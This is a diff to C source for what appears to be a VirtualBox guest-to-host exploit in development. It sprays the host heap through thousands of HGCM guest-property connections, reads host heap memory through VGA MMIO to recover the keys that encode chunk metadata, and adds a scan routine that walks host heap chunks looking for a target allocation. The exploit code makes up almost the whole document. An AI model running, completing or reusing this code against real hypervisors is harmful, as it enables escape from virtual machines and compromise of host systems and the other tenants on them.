@@ -13,23 +13,25 @@
 #define RT_BIT(n) (1<<n)
 #define off(locality, uReg) (locality * 0x1000 + uReg)
 #define TPM_CMD_BUF_SIZE 0xf80
-#define PAGE_SIZE 0x1000
-#define VMMDEV_REQUESTOR_USR_DRV 0x00000001
-#define VMMDEV_REQUESTOR_USR_ROOT 0x00000003
-#define VMMDEV_REQUESTOR_USR_USER 0x00000006
-
-const size_t TPM_MMIO_ADDR = 0xfed40000;
-const size_t TPM_MMIO_SIZE = 0x5000;
-const size_t VGA_MMIO_ADDR = 0xa0000;
-const size_t VGA_MMIO_SIZE = 0x20000;
-
-void *reqBuf;                                                                                                                                                                         
-uint32_t *cliIDs;                                                                                                                                                                     
-uint32_t idx;                                                                                                                                                                         
-uint8_t *vga;
-const uint32_t chunkSizeMetadataOffset = 0x8;
-const uint32_t chunkPrevSizeMetadatOffset = 0xc;
-const uint16_t VGAR3BufferHeapSize = 0x8001; // size shifted right by 4, actual size is 0x80010
+#define PAGE_SIZE 0x1000                                                                                                                                                                     
+#define VMMDEV_REQUESTOR_USR_DRV 0x00000001                                                                                                                                                  
+#define VMMDEV_REQUESTOR_USR_ROOT 0x00000003                                                                                                                                                 
+#define VMMDEV_REQUESTOR_USR_USER 0x00000006                                                                                                                                                 
+                                                                                                                                                                                             
+const size_t TPM_MMIO_ADDR = 0xfed40000;                                                                                                                                                     
+const size_t TPM_MMIO_SIZE = 0x5000;                                                                                                                                                         
+const size_t VGA_MMIO_ADDR = 0xa0000;                                                                                                                                                        
+const size_t VGA_MMIO_SIZE = 0x20000;                                                                                                                                                        
+                                                                                                                                                                                             
+void *reqBuf;                                                                                                                                                                                
+uint32_t *cliIDs;                                                                                                                                                                            
+uint32_t idx;                                                                                                                                                                                
+uint8_t *vga;                                                                                                                                                                                
+const uint32_t chunkSizeMetadataOffset = 0x8;                                                                                                                                                
+const uint32_t chunkPrevSizeMetadatOffset = 0xc;                                                                                                                                             
+const uint16_t VGAR3BufferHeapSize = 0x8001; // size shifted right by 4, actual size is 0x80010                                                                                              
+uint16_t heapPrevSizeKey;                                                                                                                                                                    
+uint16_t heapSizeKey;                                                                                                                                                                        
 
 void die(const char* msg)
 {
@@ -95,7 +97,7 @@ uint32_t HGCMConnect(const char *service, uint32_t fRequestor)
         outl_p(v2p(hHGCMConnect), 0xd040);
         //while (!hHGCMConnect->u32ClientID){usleep(1000);}
         if (!hHGCMConnect->u32ClientID){usleep(1000);}
-        printf("HGCM Client Connection ID: %u\n", hHGCMConnect->u32ClientID);
+        //printf("HGCM Client Connection ID: %u\n", hHGCMConnect->u32ClientID);
         return hHGCMConnect->u32ClientID;
 }
 
@@ -213,58 +215,58 @@ void spray()
         for (uint32_t round = 0; round < 3000; ++round)
         {
                 uint32_t cID = HGCMConnect("VBoxGuestPropSvc", VMMDEV_REQUESTOR_USR_DRV);
-                printf("%d", round);
+                //printf("%d", round);
                 if (cID == 0) 
                 {
-                        printf(" failed!\n");
+                        //printf(" failed!\n");
                         continue;
                 }
                 cliIDs[idx++] = cID;
-                printf(" success!\n");
+                //printf(" success!\n");
                 for (uint32_t i = 0; i < 16; ++i)
                 {
                         memset(tmp, 0, 0x70);
                         sprintf(tmp, "%08d/%08d-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", round+1, i+1);
                         //printf("Spraying %s -> ", tmp);
-                        printf("%d - Result: %x\n", i, wait_prop(cID, tmp, 0x70, tmp2, 0x1));
+                        //printf("%d - Result: %x\n", i, wait_prop(cID, tmp, 0x70, tmp2, 0x1));
                 }
         }
         for (uint32_t round = 0; round < 2000; ++round)
         {
                 uint32_t cID = HGCMConnect("VBoxGuestPropSvc", VMMDEV_REQUESTOR_USR_ROOT);
-                printf("%d", round);
+                //printf("%d", round);
                 if (cID == 0) 
                 {
-                        printf(" failed!\n");
+                        //printf(" failed!\n");
                         continue;
                 }
                 cliIDs[idx++] = cID;
-                printf(" success!\n");
+                //printf(" success!\n");
                 for (uint32_t i = 0; i < 16; ++i)
                 {
                         memset(tmp, 0, 0x70);
                         sprintf(tmp, "%08d/%08d-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", round+1, i+1);
                         //printf("Spraying %s -> ", tmp);
-                        printf("%d - Result: %x\n", i, wait_prop(cID, tmp, 0x70, tmp2, 0x1));
+                        //printf("%d - Result: %x\n", i, wait_prop(cID, tmp, 0x70, tmp2, 0x1));
                 }
         }
         for (uint32_t round = 0; round < 1024; ++round)
         {
                 uint32_t cID = HGCMConnect("VBoxGuestPropSvc", VMMDEV_REQUESTOR_USR_USER);
-                printf("%d", round);
+                //printf("%d", round);
                 if (cID == 0) 
                 {
-                        printf(" failed!\n");
+                        //printf(" failed!\n");
                         continue;
                 }
                 cliIDs[idx++] = cID;
-                printf(" success!\n");
+                //printf(" success!\n");
                 for (uint32_t i = 0; i < 16; ++i)
                 {
                         memset(tmp, 0, 0x70);
                         sprintf(tmp, "%08d/%08d-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", round+1, i+1);
                         //printf("Spraying %s -> ", tmp);
-                        printf("%d - Result: %x\n", i, wait_prop(cID, tmp, 0x70, tmp2, 0x1));
+                        //printf("%d - Result: %x\n", i, wait_prop(cID, tmp, 0x70, tmp2, 0x1));
                 }
         }
         printf("Searching...\n");
@@ -309,28 +311,92 @@ void spray()
                 }
         }
         */
-        printf("Disconnecting clients...\n");
-        while (idx > -1) HGCMDisconnect(cliIDs[--idx]);
-        memset(cliIDs, 0, sizeof(uint32_t) * 4096);
-        sleep(3);
+        //printf("Disconnecting clients...\n");
+        //while (idx > -1) HGCMDisconnect(cliIDs[--idx]);
+        //memset(cliIDs, 0, sizeof(uint32_t) * 4096);
+        //sleep(3);
 }
 
-void tmp()
+void checkHeapKeys()
 {
-	uint16_t prevsizeKey;
+        uint16_t prevsizeKey;
+        uint16_t chunkSizeKey;
+        uint16_t mightBePrevChunkSize;
+        uint16_t chunkSize;
     switchVGA(2, 0);
     prevsizeKey = *(vga+3);
     switchVGA(2, 1);
     prevsizeKey += *(vga+3) << 8;
     prevsizeKey ^= VGAR3BufferHeapSize;
+    
+    uint64_t readCount = 0;
+    while (1)
+    {
+        switchVGA(2, 0);
+        mightBePrevChunkSize = *(vga+readCount+3);
+        switchVGA(2, 1);
+        mightBePrevChunkSize += *(vga+readCount+3) << 8;
+        if ((readCount * 4) == (mightBePrevChunkSize ^ prevsizeKey) << 4)
+        {
+                switchVGA(2, 0);
+                chunkSize = *(vga+2);
+                switchVGA(2, 1);
+                chunkSize += *(vga+2) << 8;
+                chunkSizeKey = chunkSize ^ ((readCount * 4) >> 4);
+                break;
+        }
+        ++readCount;
+    }
+    heapPrevSizeKey = prevsizeKey;
+    heapSizeKey = chunkSizeKey;
     printf("0x%x\n", prevsizeKey);
+    printf("0x%x\n", chunkSizeKey);
+}
+
+void holyScan()
+{
+        // please work Jesus Christ...
+        uint64_t readCount = 0;
+        uint32_t currentPage = 2;
+        uint8_t freed;
+        uint16_t currentChunkSize;
+        while (1){
+                switchVGA(currentPage, 0);
+                currentChunkSize = *(vga+readCount+2);
+                switchVGA(currentPage, 1);
+                currentChunkSize += *(vga+readCount+2) << 8;
+                printf("Encoded current chunk size: 0x%x\n", currentChunkSize);
+                currentChunkSize ^= heapSizeKey;
+                currentChunkSize <<= 4;
+                switchVGA(currentPage, 2);
+                freed = *(vga+readCount+2) & 1;
+                printf("Freed? 0x%x\n", freed);
+                printf("Current page: %d\n", currentPage);
+                printf("Read: 0x%lx\n", readCount);
+                printf("Current chunk size: 0x%x\n", currentChunkSize);
+                //getchar();
+                usleep(750);
+                if (currentChunkSize == 0x80 && !freed) break;
+                readCount += currentChunkSize / 4;
+                if (readCount > 0xffff)
+                {
+                        readCount %= 0x10000;
+                        ++currentPage;
+                }
+        }
+        printf("hmm...");
+
 }
 
 int main()
 {
-	init();
+        init();
         //while (1) spray();
-        tmp();
+        checkHeapKeys();
+        spray();
+        printf("God Bless You!\n");
+        getchar();
+        holyScan();
         //switchVGA(0);
         //printf("0x%hhx ", vga[0]);
 }
